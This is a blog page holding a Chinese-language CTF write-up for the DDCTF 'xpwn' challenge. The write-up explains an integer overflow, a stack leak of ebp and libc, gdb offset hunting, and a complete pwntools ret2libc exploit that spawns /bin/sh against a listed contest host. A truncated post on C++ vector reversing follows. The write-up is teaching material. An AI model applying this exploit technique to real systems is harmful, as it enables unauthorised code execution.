<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="English">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="One people that no one know">
<meta property="og:type" content="website">
<meta property="og:title" content="NoOne-hub">
<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;page&#x2F;6&#x2F;index.html">
<meta property="og:site_name" content="NoOne-hub">
<meta property="og:description" content="One people that no one know">
<meta property="og:locale" content="English">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://noone-hub.github.io/page/6/"/>





  <title>NoOne-hub</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="English">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NoOne-hub</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">A place that No One knw</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/pwn/pwn-stack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/19/pwn/pwn-stack/" itemprop="url">pwn-stack</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">
                2019-04-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn-stack/" itemprop="url" rel="index">
                    <span itemprop="name">-- pwn -- stack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p>
<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_804862D()内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul>
<li>在具体地方附加，用gdb.attach(io)附加，然后finish 3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li>
</ul>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p>
<ul>
<li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li>
</ul>
<h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p>
<p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p>
<p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p>
<p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p>
<p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p>
<p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p>
<p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p>
<p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p>
<p>所以，我输出一下这里的地址看看内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure>
<p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p>
<p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



<p><strong>总结：</strong></p>
<ul>
<li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li>
<li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li>
<li>如果还有什么不懂了，可以下方留言</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/18/re/C-vector-reverse/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/18/re/C-vector-reverse/" itemprop="url">C++_vector_reverse</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-18T01:21:02+08:00">
                2019-04-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse-c/" itemprop="url" rel="index">
                    <span itemprop="name">-- reverse -- c++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="C-逆向之容器vector篇入门（本文首发于安全客）"><a href="#C-逆向之容器vector篇入门（本文首发于安全客）" class="headerlink" title="C++逆向之容器vector篇入门（本文首发于安全客）"></a>C++逆向之容器vector篇入门（本文首发于安全客）</h1><p>前言：说实话，我自己也不会c++的逆向。然后，现在太多的题目是c++的逆向了，一上来就是一堆容器，搞得我不得不去补补c++逆向部分的知识了，我这篇文章以西湖论剑的easyCpp为例，希望能给那些跟我一样是c++逆向的新手的朋友们一点启发。下面我就开始我的抛砖引玉篇幅吧，在这篇文章里，我会以题目中出现的逆向出来的代码以及C++的代码进行对比，让你们更好的知道，c++容器入门篇其实不难，开始正文：</p>
<p>我将先给你们介绍每个容器操作的代码以及ida反汇编出来的代码进行对比</p>
<h2 id="vector的构造以及析构"><a href="#vector的构造以及析构" class="headerlink" title="vector的构造以及析构"></a>vector的构造以及析构</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//声明一个int型向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span 